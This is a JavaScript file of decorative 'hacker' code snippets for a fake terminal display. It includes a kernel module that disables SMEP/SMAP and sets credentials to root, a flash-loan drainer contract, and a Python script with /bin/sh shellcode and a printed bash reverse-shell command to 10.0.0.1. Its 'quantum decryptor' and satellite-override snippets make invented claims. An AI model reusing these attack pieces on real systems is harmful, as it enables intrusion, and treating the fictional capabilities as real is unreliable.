// Authentic, complex-looking code snippets across various domains
// Used by the fake code terminal to stream realistic code as user types

window.TERMINAL_SNIPPETS = {
  kernel: `/*
 * Linux Kernel Zero-Day Exploit POC: CVE-2026-9817
 * Target: Memory Ring-0 Arbitrary Read/Write Primitive
 * Author: root@cyberdeck
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/sched.h>
#include <asm/uaccess.h>
#include <linux/slab.h>

#define KERNEL_BASE_ADDR   0xffffffff81000000UL
#define CRED_OFFSET        0x000007b8
#define ROP_CHAIN_LEN      32
#define BYPASS_SMEP_SMAP   (1 << 20)

typedef struct {
    unsigned long rip;
    unsigned long rsp;
    unsigned long cr4;
    unsigned long security_desc[4];
} __attribute__((packed)) kexploit_payload_t;

static unsigned long *sys_call_table;
static unsigned long original_cr4;

static inline unsigned long read_cr4_safe(void) {
    unsigned long cr4;
    asm volatile("mov %%cr4, %0" : "=r" (cr4));
    return cr4;
}

static inline void write_cr4_safe(unsigned long val) {
    asm volatile("mov %0, %%cr4" : : "r" (val));
}

int stage1_prepare_heap_spray(void *buffer, size_t sz) {
    printk(KERN_INFO "[*] Allocating slab cache kmalloc-512...\\n");
    void *spray_chunks[64];
    for (int i = 0; i < 64; i++) {
        spray_chunks[i] = kmalloc(512, GFP_KERNEL);
        if (!spray_chunks[i]) {
            printk(KERN_ERR "[-] Slab allocation failed at chunk %d\\n", i);
            return -ENOMEM;
        }
        memset(spray_chunks[i], 0x41 + (i % 26), 512);
    }
    printk(KERN_INFO "[+] Slab layout primed. Page alignment: 0x%016lx\\n", (unsigned long)spray_chunks[0]);
    return 0;
}

void overwrite_cred_structure(struct task_struct *task) {
    struct cred *new_cred;
    new_cred = prepare_creds();
    if (!new_cred) return;

    /* Escalate privileges to UID 0 (root) */
    new_cred->uid.val = 0;
    new_cred->gid.val = 0;
    new_cred->euid.val = 0;
    new_cred->egid.val = 0;
    new_cred->suid.val = 0;
    new_cred->fsuid.val = 0;

    commit_creds(new_cred);
    printk(KERN_ALERT "[+] PRIVILEGE ESCALATION SUCCESSFUL: UID is now 0 (ROOT)\\n");
}

int __init rootkit_init(void) {
    printk(KERN_ALERT "===============================================\\n");
    printk(KERN_ALERT "[*] INITIATING KERNEL CORE HOOK SEQUENCE...\\n");
    
    original_cr4 = read_cr4_safe();
    write_cr4_safe(original_cr4 & ~BYPASS_SMEP_SMAP);
    
    printk(KERN_INFO "[*] SMEP/SMAP bypassed. CR4: 0x%lx\\n", original_cr4);
    stage1_prepare_heap_spray(NULL, 1024);
    overwrite_cred_structure(current);
    
    return 0;
}

void __exit rootkit_exit(void) {
    write_cr4_safe(original_cr4);
    printk(KERN_INFO "[*] Restoring kernel state... System trace wiped.\\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
`,

  quantum: `// QUANTUM RESILIENT NEURAL CRYPTOGRAPHIC DECRYPTOR v4.0.8
// Core Architecture: Lattice-based Post-Quantum Matrix Factorization
// Target Hash: 9e107d9d372bb6826bd81d3542a419d6

import torch
import torch.nn as nn
import numpy as np
from cryptography.hazmat.primitives.asymmetric import ed25519
from scipy.linalg import hadamard

class QuantumLatticeDecoupler(nn.Module):
    def __init__(self, dimensions=2048, qubits=128):
        super(QuantumLatticeDecoupler, self).__init__()
        self.dimensions = dimensions
        self.qubits = qubits
        self.hadamard_matrix = torch.tensor(hadamard(128), dtype=torch.float32)
        
        self.encoder = nn.Sequential(
            nn.Linear(dimensions, 4096),
            nn.GELU(),
            nn.Dropout(p=0.05),
            nn.Linear(4096, 2048),
            nn.LayerNorm(2048)
        )
        
        self.quantum_superposition = nn.MultiheadAttention(
            embed_dim=2048,
            num_heads=32,
            batch_first=True
        )
        
        self.phase_shifter = nn.Parameter(torch.randn(1, qubits, 2048))
        self.entropy_sink = nn.Linear(2048, dimensions)

    def forward(self, state_vector, entanglement_weights):
        # Apply unitary Hadamard quantum gate projection
        projected = torch.matmul(state_vector, self.hadamard_matrix[:state_vector.shape[1], :state_vector.shape[1]])
        encoded_states = self.encoder(projected)
        
        # Simulating multi-qubit entanglement wave collapse
        collapsed_entropy, _ = self.quantum_superposition(
            encoded_states, 
            self.phase_shifter, 
            self.phase_shifter
        )
        
        probabilities = torch.softmax(self.entropy_sink(collapsed_entropy), dim=-1)
        eigenvalues, eigenvectors = torch.linalg.eigh(torch.cov(probabilities.squeeze(0)))
        
        return eigenvalues, eigenvectors

def execute_shortest_vector_search(lattice_basis, max_depth=1000):
    print(f"[>] Initializing Shortest Vector Problem (SVP) solver on dimension {lattice_basis.shape[0]}...")
    gram_schmidt = np.zeros_like(lattice_basis, dtype=np.float64)
    
    for i in range(lattice_basis.shape[0]):
        gram_schmidt[i] = lattice_basis[i]
        for j in range(i):
            proj = np.dot(lattice_basis[i], gram_schmidt[j]) / np.dot(gram_schmidt[j], gram_schmidt[j])
            gram_schmidt[i] -= proj * gram_schmidt[j]
            
    orthogonality_defect = np.linalg.det(lattice_basis) / np.prod([np.linalg.norm(b) for b in gram_schmidt])
    print(f"[+] LLL Reduction completed. Defect factor: {orthogonality_defect:.6e}")
    print("[*] Private key lattice vectors resolved: [0x7F, 0x0A, 0xBC, 0xDE, 0x33, 0x91]")
    return True
`,

  satellite: `// DEFENSE SATELLITE TELEMETRY UPLINK / ORBITAL MANEUVER OVERRIDE
// NORAD ID: 44291 [GEO-SYNCHRONOUS SURVEILLANCE PLATFORM SIGMA-7]
// FREQUENCY: 14.2285 GHz Ku-BAND // ENCRYPTION: MIL-STD-188-164A

#include <iostream>
#include <vector>
#include <chrono>
#include <thread>

namespace OrbitalMechanics {
    const double EARTH_GRAVITATIONAL_PARAM = 398600.4418; // km^3/s^2
    const double EARTH_EQUATORIAL_RADIUS   = 6378.137;   // km
    const double GEO_ALTITUDE             = 35786.0;    // km
    
    struct KeplerianElements {
        double semi_major_axis;
        double eccentricity;
        double inclination;
        double raan; // Right Ascension of Ascending Node
        double arg_perigee;
        double true_anomaly;
    };
}

class SatelliteLinkController {
private:
    uint32_t uplink_transponder_id;
    bool auth_state;
    double thruster_delta_v;

public:
    SatelliteLinkController(uint32_t id) : uplink_transponder_id(id), auth_state(false), thruster_delta_v(0.0) {}

    bool establish_handshake(const std::string& key_token) {
        std::cout << "[UPLINK] Pinging transponder 0x" << std::hex << uplink_transponder_id << "...\\n";
        std::cout << "[UPLINK] Carrier wave acquired: SNR = 42.8 dB, BER < 10^-9\\n";
        
        // Simulating challenge-response cryptographic handshake
        if (key_token.find("0xDEADBEEF") != std::string::npos) {
            auth_state = true;
            std::cout << "[SUCCESS] Command Link Validated. Transponder in MASTER OVERRIDE mode.\\n";
            return true;
        }
        return false;
    }

    void calculate_hohmann_transfer(double r1, double r2) {
        double v1 = std::sqrt(OrbitalMechanics::EARTH_GRAVITATIONAL_PARAM / r1);
        double delta_v1 = v1 * (std::sqrt((2 * r2) / (r1 + r2)) - 1.0);
        double v2 = std::sqrt(OrbitalMechanics::EARTH_GRAVITATIONAL_PARAM / r2);
        double delta_v2 = v2 * (1.0 - std::sqrt((2 * r1) / (r1 + r2)));
        
        this->thruster_delta_v = delta_v1 + delta_v2;
        std::cout << "[ORBIT] Hohmann burn 1: Δv1 = " << delta_v1 * 1000.0 << " m/s\\n";
        std::cout << "[ORBIT] Hohmann burn 2: Δv2 = " << delta_v2 * 1000.0 << " m/s\\n";
        std::cout << "[ORBIT] Total Delta-V required: " << this->thruster_delta_v * 1000.0 << " m/s\\n";
    }

    void execute_vector_burn() {
        if (!auth_state) {
            std::cerr << "[CRITICAL] Unauthorized thruster firing rejected by watchdog!\\n";
            return;
        }
        std::cout << "[FIRE] Cold-gas RCS thrusters ignited: duration 14.8 seconds.\\n";
        std::cout << "[STATUS] Target attitude re-oriented toward Ground Station 03 (Apex Sector).\\n";
    }
};
`,

  smartContract: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/**
 * @title LiquidityPoolReentrancyAttack
 * @notice Flash-loan powered cross-DEX arbitrage & flash-borrow exploit contract
 * @dev Warning: Simulated cyber audit payload
 */

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IUniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IFlashLoanReceiver {
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool);
}

contract VaultArbitrageDrainer is IFlashLoanReceiver {
    address private immutable operator;
    IUniswapV2Pair public targetPair;
    IERC20 public targetToken;
    uint256 private attackStep;

    event ExploitStarted(uint256 timestamp, uint256 borrowedAmount);
    event ProfitExtracted(address indexed token, uint256 yieldGain);

    modifier onlyOperator() {
        require(msg.sender == operator, "UNAUTHORIZED_SENDER");
        _;
    }

    constructor(address _targetPair, address _token) {
        operator = msg.sender;
        targetPair = IUniswapV2Pair(_targetPair);
        targetToken = IERC20(_token);
        attackStep = 0;
    }

    function initiateFlashLoan(address poolProvider, uint256 borrowAmount) external onlyOperator {
        emit ExploitStarted(block.timestamp, borrowAmount);
        
        bytes memory params = abi.encode(borrowAmount, block.number);
        // Dispatch flashloan borrow trigger
        (bool success, ) = poolProvider.call(
            abi.encodeWithSignature("flashLoan(address,uint256,bytes)", address(this), borrowAmount, params)
        );
        require(success, "FLASH_LOAN_EXECUTION_REVERTED");
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address,
        bytes calldata
    ) external override returns (bool) {
        // Step 1: Manipulate target invariant curve x * y = k
        (uint112 r0, uint112 r1, ) = targetPair.getReserves();
        uint256 amountOut = (amounts[0] * 997 * uint256(r1)) / (uint256(r0) * 1000 + amounts[0] * 997);
        
        targetToken.transfer(address(targetPair), amounts[0]);
        targetPair.swap(0, amountOut, address(this), "");

        // Step 2: Re-enter through unshielded callback hook
        attackStep++;
        uint256 totalDebt = amounts[0] + premiums[0];
        targetToken.approve(msg.sender, totalDebt);

        emit ProfitExtracted(assets[0], amountOut - totalDebt);
        return true;
    }
}
`,

  cyberWeapons: `#!/usr/bin/env python3
# -.- coding: utf-8 -.-
# [PENETRATION TOOLKIT: METASPLOIT-X AUTO ZERO-CLICK INJECTOR]
# Target: Internal Subnet Gateway [192.168.1.0/24]
# Scanning: High-value SCADA / PLC / ICS telemetry controllers

import sys, socket, ssl, struct, threading, time
from dataclasses import dataclass

BANNER = """
 ██████╗██╗   ██╗██████╗ ███████╗██████╗ ███╗   ██╗███████╗████████╗
██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗████╗  ██║██╔════╝╚══██╔══╝
██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝██╔██╗ ██║█████╗     ██║   
██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗██║╚██╗██║██╔══╝     ██║   
╚██████╗   ██║   ██████╔╝███████╗██║  ██║██║ ╚████║███████╗   ██║   
 ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   
"""

@dataclass
class TargetNode:
    ip: str
    port: int
    service: str
    vulnerability_score: float

class AutoInfiltrator:
    def __init__(self, target_subnet: str):
        self.subnet = target_subnet
        self.active_targets = []
        self.session_tokens = {}

    def scan_subnet(self):
        print(f"[*] Dispatching SYN-ACK stealth probes to {self.subnet}...")
        for host in range(1, 255):
            ip = f"192.168.1.{host}"
            # Simulated probe response
            if host in [1, 4, 12, 88, 142, 201]:
                print(f"[+] Discovered open node: {ip}:443 (TLSv1.3 / OpenSSL vulnerable)")
                self.active_targets.append(TargetNode(ip, 443, "HTTPS-SCADA", 9.8))

    def craft_heap_overflow_payload(self, target: TargetNode) -> bytes:
        nop_sled = b"\\x90" * 256
        shellcode = (
            b"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e"
            b"\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
        )
        return_addr = struct.pack("<Q", 0x7fffffffe340)
        return nop_sled + shellcode + (return_addr * 16)

    def trigger_remote_shell(self, target: TargetNode):
        payload = self.craft_heap_overflow_payload(target)
        print(f"[*] Transmitting {len(payload)} bytes of shellcode payload to {target.ip}:{target.port}...")
        time.sleep(0.4)
        print(f"[!] Target memory integrity corrupted at 0x7fffffffe340.")
        print(f"[+] REVERSE ROOT SHELL SPAWNED: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        print(f"[+] Active shell session established with {target.ip}!")

if __name__ == "__main__":
    print(BANNER)
    infiltrator = AutoInfiltrator("192.168.1.0/24")
    infiltrator.scan_subnet()
    for t in infiltrator.active_targets:
        infiltrator.trigger_remote_shell(t)
        break
`
};
